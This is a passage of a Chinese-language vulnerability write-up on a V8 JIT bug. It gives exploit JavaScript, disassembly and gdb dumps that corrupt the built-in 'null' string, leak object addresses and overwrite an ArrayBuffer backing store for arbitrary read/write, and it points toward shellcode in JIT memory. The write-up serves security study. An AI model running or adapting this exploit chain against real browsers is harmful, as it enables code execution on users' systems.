0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x0019000400007300</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">后:</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x41e04d0a5e800000--&gt;破坏了map结构</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">...</span><br><span class="line">0x35680eb86ccd    77  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86cd7    87  4152           push r10</span><br><span class="line">0x35680eb86cd9    89  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86ce3    99  4152           push r10</span><br><span class="line">0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 &lt;JS Function parseInt (SharedFunctionInfo 0xf6ab33ce11)&gt;</span><br><span class="line">0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]</span><br><span class="line">0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]</span><br><span class="line">0x35680eb86cfb   123  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86d00   128  bb02000000     movl rbx,0x2</span><br><span class="line">0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86d14   148  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb86d17   151  5d             pop rbp</span><br><span class="line">0x35680eb86d18   152  c20800         ret 0x8</span><br><span class="line">0x35680eb86d1b   155  90             nop</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>据此，我们可以得出结论，在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919133141e-308</span>;    <span class="comment">// do not modify string map </span></span><br><span class="line">    n.xyz1 = <span class="number">0x1821923f</span>                 <span class="comment">// do not modify hash value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>         <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x1c4269306d80     0  55             push rbp</span><br><span class="line">0x1c4269306d81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x1c4269306d84     4  56             push rsi</span><br><span class="line">0x1c4269306d85     5  57             push rdi</span><br><span class="line">0x1c4269306d86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x1c4269306d8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x1c4269306d8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x1c4269306d92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x1c4269306d95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x1c4269306d9c    28  7305           jnc 35  (0x1c4269306da3)</span><br><span class="line">0x1c4269306d9e    30  e83dbbf5ff     call StackCheck  (0x1c42692628e0)    ;; code: BUILTIN</span><br><span class="line">0x1c4269306da3    35  48b8d9b9fadec60a0000 REX.W movq rax,0xac6defab9d9    ;; object: 0xac6defab9d9 PropertyCell for 0x3b0974d0a4b9 &lt;a Set with map 0x30613ee86509&gt;</span><br><span class="line">0x1c4269306dad    45  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F;取出JSSet n</span><br><span class="line">0x1c4269306db1    49  49ba0064000004001900 REX.W movq r10,0x19000400006400</span><br><span class="line">0x1c4269306dbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x1c4269306dc0    64  488b5807       REX.W movq rbx,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306dc4    68  488b5b0f       REX.W movq rbx,[rbx+0xf] &#x2F;&#x2F; 取n的xyz域，注意取域的时候，如果这个域代表的意义是一个整数值，就直接写入，如果代表的是一个指针，就要从指针再寻址写入。</span><br><span class="line">0x1c4269306dc8    72  c5fb114307     vmovsd [rbx+0x7],xmm0</span><br><span class="line">0x1c4269306dcd    77  488b5807       REX.W movq rbx,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306dd1    81  c7431b3f922118 movl [rbx+0x1b],0x1821923f &#x2F;&#x2F; 取n的xyz1域，注意这里要用一个整形数去完整替换，不然会变成一个HeapNum指针，而这个指针是可能访问到不能访问的内存，从而crash</span><br><span class="line">0x1c4269306dd8    88  488b4007       REX.W movq rax,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">0x1c4269306ddc    92  c7402300700000 movl [rax+0x23],0x7000 &#x2F;&#x2F; 取n的xyz1域</span><br><span class="line">...</span><br><span class="line">最终</span><br><span class="line">gdb-peda$ x&#x2F;20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">0x1c4269306de3    99  48b8112380ec67300000 REX.W movq rax,0x3067ec802311    ;; object: 0x3067ec802311 &lt;undefined&gt;</span><br><span class="line">0x1c4269306ded   109  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x1c4269306df0   112  5d             pop rbp</span><br><span class="line">0x1c4269306df1   113  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x2b753502250:0x00003182a4182361-&gt;null0x00000000803b1506</span><br><span class="line">0x2b753502260:0x00000004-&gt;length 000000000xdeadbeed 6c6c756e-&gt;&quot;null&quot;</span><br><span class="line">0x2b753502270:0x00003182a4182361-&gt;object0x00000000c5f6c42a</span><br><span class="line">0x2b753502280:0x0000000600000000-&gt;length0xdead 7463656a626f-&gt;&quot;object&quot;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job 0x2b753502251</span><br><span class="line">#null</span><br><span class="line">gdb-peda$ job 0x2b753502271</span><br><span class="line">#object</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-12-092410.jpg" alt=""></p><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>表示JavaScript function的对象</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li><p>存放function f()在数组中</p></li><li><p>用0xdeadbee查找这个数组的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142310.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142325.png" alt=""></p></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef</li></ul>  <strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong><ul><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]</li></ul>  <strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br>  <strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3>主要是用于double和int值的转换<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="leak-ArrayBuffer和Function"><a href="#leak-ArrayBuffer和Function" class="headerlink" title="leak ArrayBuffer和Function"></a>leak ArrayBuffer和Function</h3></li></ul></li></ul><ol><li>触发漏洞，越界写null string的长度，写null string的value字段为obj</li><li>charCodeAt读出null string的value内容，从而leak出来<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object </span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Check(ab); <span class="comment">//写入ArrayBuffer到value字段</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/10gx 0x28767ae02240</span></span><br><span class="line"><span class="comment">// 0x28767ae02240:0x00000834750823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x28767ae02250:0x00000834750823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x28767ae02260:0x00007000000000000x000004ea79906839-&gt;ArrayBuffer</span></span><br><span class="line"><span class="comment">// 0x28767ae02270:0x00000834750823610x00000000c5f6c42a</span></span><br><span class="line"><span class="comment">// 0x28767ae02280:0x00000006000000000xdead7463656a626f</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x000004ea79906839</span></span><br><span class="line"><span class="comment">// 0x4ea79906839: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x3bcf5fc82db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0xb3e9b805599</span></span><br><span class="line"><span class="comment">//  - elements = 0x28767ae02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x55ba589d0640</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>同理，leak出function<h3 id="写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string"><a href="#写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string" class="headerlink" title="写null string的地址到它自己的value，从而可以通过写value来再次修改null string"></a>写null string的地址到它自己的value，从而可以通过写value来再次修改null string</h3></li></ol><p><strong>这里为什么要这么做呢，原因其实在test里已经可以看到的，如果我们写一个smi到一个属性字段，当然可以直接写到该属性字段对应的偏移。</strong><br>也就是如图xyz1，我直接写入了一个0x1821923f的smi，注意smi最大是多少呢，在64位和32位有所不同。<br>在64位平台上V8对smi定义的范围是[-2³¹，2³¹-1]，即最大0x7fffffff，显然一个对象的地址会大于它，从而无法直接去写一个地址到该属性字段对应的偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br></pre></td></tr></table></figure><p><strong>所以我们要写null string的地址到它自己的value，从而可以通过写value来再次修改null string。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx $rbx-1</span></span><br><span class="line"><span class="comment">// 0x3817fa502240:0x00003bd6a43823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x00003bd6a4382361</span></span><br><span class="line"><span class="comment">// 0x3bd6a4382361: [Map]</span></span><br><span class="line"><span class="comment">//  - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span></span><br><span class="line"><span class="comment">//  - instance size: 0</span></span><br><span class="line"><span class="comment">//  - elements kind: FAST_HOLEY_ELEMENTS</span></span><br><span class="line"><span class="comment">//  - unused property fields: 0</span></span><br><span class="line"><span class="comment">//  - enum length: invalid</span></span><br><span class="line"><span class="comment">//  - stable_map</span></span><br><span class="line"><span class="comment">//  - back pointer: 0x3817fa502311 &lt;undefined&gt;</span></span><br><span class="line"><span class="comment">//  - instance descriptors (own) #0: 0x3817fa502231 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - layout descriptor: 0</span></span><br><span class="line"><span class="comment">//  - prototype: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - constructor: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - code cache: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - dependent code: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - construction counter: 0</span></span><br></pre></td></tr></table></figure><h3 id="修改null-string的hash字段为ArrayBuffer的length地址"><a href="#修改null-string的hash字段为ArrayBuffer的length地址" class="headerlink" title="修改null string的hash字段为ArrayBuffer的length地址"></a>修改null string的hash字段为ArrayBuffer的length地址</h3><p>这里我再次提醒一下为什么要写入这个地址。<br>之前我们说了，如果写一个smi，可以直接写入，但是如果要写入的数值大于smi，会把该属性字段的值当成一个指针，然后将这个数值写入到那个内存里。<br>就比如，我向null string的map字段（对应于n.xyz)写一个非SMI进去.<br>double类型的3.4766863919152113e-308等于int类型的0x0019000400007300</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x33e606b02241</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x33e606b02240</span>:<span class="number">0x0000081f59a02309</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33e606b02250</span>:<span class="number">0x0000081f59a02361</span>-&gt;n.xyz<span class="number">0x00000000803b1506</span></span><br><span class="line"><span class="number">0x33e606b02260</span>:<span class="number">0x0000700000000000</span><span class="number">0x000017f1e8c36fe96f</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x0000081f59a02361</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x81f59a02360</span>:<span class="number">0x0000081f59a02259</span><span class="number">0x0019000400007300</span>-&gt;被写入的<span class="number">3.4766863919152113e-308</span>即<span class="number">0x0019000400007300</span></span><br><span class="line"><span class="number">0x81f59a02370</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000033e606b02201</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span> <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">m.xyz3 = addr</span><br><span class="line">&#125;</span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x0000108ed87359d9-&gt;ArrayBuffer length的地址</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000-&gt;length</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x000055ba589d0640-&gt;BackingStore</span></span><br></pre></td></tr></table></figure><p><strong>所以说为了写入一个地址到ArrayBuffer的BackingStore，首先将BackingStore向前减去8个字节的地址即length地址写入到hash字段。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073443.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073449.jpg" alt=""></p><h3 id="向null-string的hash字段写入任意值，得到任意地址读写的原语"><a href="#向null-string的hash字段写入任意值，得到任意地址读写的原语" class="headerlink" title="向null string的hash字段写入任意值，得到任意地址读写的原语"></a>向null string的hash字段写入任意值，得到任意地址读写的原语</h3><p>类似于我们上面写map一样，将[length_addr+0x8]即backingstore给覆盖成我们想要写入的内容。<br><strong>在v8里，只要你能修改backingstore的值，就可以进行任意地址读写</strong><br>于是就有了一个任意地址读写的原语。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073824.png" alt=""></p><p><strong>于是我们先将func_addr写到backingstore，读到函数真正执行时候的code地址</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 